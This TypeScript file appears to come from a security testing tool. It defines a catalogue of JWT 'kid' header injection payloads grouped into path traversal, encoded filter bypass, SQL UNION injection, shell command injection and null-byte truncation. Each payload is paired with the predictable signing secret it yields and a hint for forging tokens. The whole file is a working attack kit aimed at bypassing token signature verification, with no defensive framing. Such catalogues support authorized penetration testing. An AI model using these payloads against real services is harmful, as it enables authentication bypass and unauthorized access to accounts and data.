export type KidCategory = "path-traversal" | "filter-bypass" | "sql" | "command" | "null-byte";

export interface KidPayload {
  label: string;
  value: string;
  secret: string;
  hint: string;
}

export interface KidCategoryDef {
  value: KidCategory;
  label: string;
  tagline: string;
  payloads: KidPayload[];
}

export const KID_CATEGORIES: KidCategoryDef[] = [
  {
    value: "path-traversal",
    label: "Path Traversal",
    tagline: "Point kid at a predictable file - server reads it as the signing key.",
    payloads: [
      {
        label: "/dev/null - 6 levels",
        value: "../../../../../../dev/null",
        secret: "",
        hint: "Server reads an empty file - key is empty string.",
      },
      {
        label: "/dev/null - 8 levels",
        value: "../../../../../../../../dev/null",
        secret: "",
        hint: "Deeper traversal for apps mounted below the filesystem root.",
      },
      {
        label: "/proc/sys/kernel/randomize_va_space",
        value: "../../../../../../proc/sys/kernel/randomize_va_space",
        secret: "2",
        hint: "Linux kernel file - content is almost always '2'. Predictable on any standard Linux host.",
      },
      {
        label: "/proc/version",
        value: "../../../../../../proc/version",
        secret: "",
        hint: "Linux version string - useful when you know the exact kernel version of the target.",
      },
    ],
  },
  {
    value: "filter-bypass",
    label: "Filter Bypass",
    tagline: "Bypass naive sanitizers that strip ../ before resolving the path.",
    payloads: [
      {
        label: "....// x6",
        value: "....//....//....//....//....//....//dev/null",
        secret: "",
        hint: "After one pass of ../ stripping, ....// collapses back to ../.",
      },
      {
        label: "URL-encoded - %2e%2e%2f",
        value: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fdev%2fnull",
        secret: "",
        hint: "Fully percent-encoded traversal - bypasses blacklist filters matching literal ../ strings.",
      },
      {
        label: "Double URL-encoded - ..%252f",
        value: "..%252f..%252f..%252f..%252f..%252f..%252fdev%252fnull",
        secret: "",
        hint: "%25 decodes to %. After one decode: ..%2f. After second decode: ../. Bypasses single-decode filters.",
      },
    ],
  },
  {
    value: "sql",
    label: "SQL Injection",
    tagline: "Inject into the key lookup query - force it to return a value you control.",
    payloads: [
      {
        label: "UNION SELECT 'secret'",
        value: "x' UNION SELECT 'secret'--",
        secret: "secret",
        hint: "Forces the query to return 'secret' as the key.",
      },
      {
        label: "UNION SELECT '' (empty key)",
        value: "x' UNION SELECT ''--",
        secret: "",
        hint: "Forces an empty string as the key.",
      },
      {
        label: "UNION SELECT char(0) - SQLite",
        value: "x' UNION SELECT char(0)--",
        secret: "",
        hint: "SQLite: returns a null byte as the key.",
      },
    ],
  },
  {
    value: "command",
    label: "Command Injection",
    tagline: "If the server executes kid as a shell command, make it output a value you control.",
    payloads: [
      {
        label: "; echo 'secret'",
        value: "; echo 'secret'",
        secret: "secret",
        hint: "Semicolon chain - if executed, the command outputs 'secret'.",
      },
      {
        label: "| echo 'secret'",
        value: "| echo 'secret'",
        secret: "secret",
        hint: "Pipe variant - alternative separator for command chaining on some shells.",
      },
      {
        label: "`echo secret`",
        value: "`echo secret`",
        secret: "secret",
        hint: "Backtick substitution - inline command execution, widely supported.",
      },
      {
        label: "$(echo secret)",
        value: "$(echo secret)",
        secret: "secret",
        hint: "POSIX command substitution - equivalent to backticks, works in bash and sh.",
      },
    ],
  },
  {
    value: "null-byte",
    label: "Null Byte",
    tagline: "Terminate the kid string early to truncate paths or bypass extension checks.",
    payloads: [
      {
        label: "/dev/null\\x00",
        value: "../../../../../../dev/null\x00",
        secret: "",
        hint: "Null byte after the path - truncates any suffix the server appends (e.g. '.pem', '.key').",
      },
      {
        label: "key\\x00.pem",
        value: "key\x00.pem",
        secret: "",
        hint: "Server resolves 'key' instead of 'key.pem'. Useful when the app forces a file extension.",
      },
    ],
  },
];
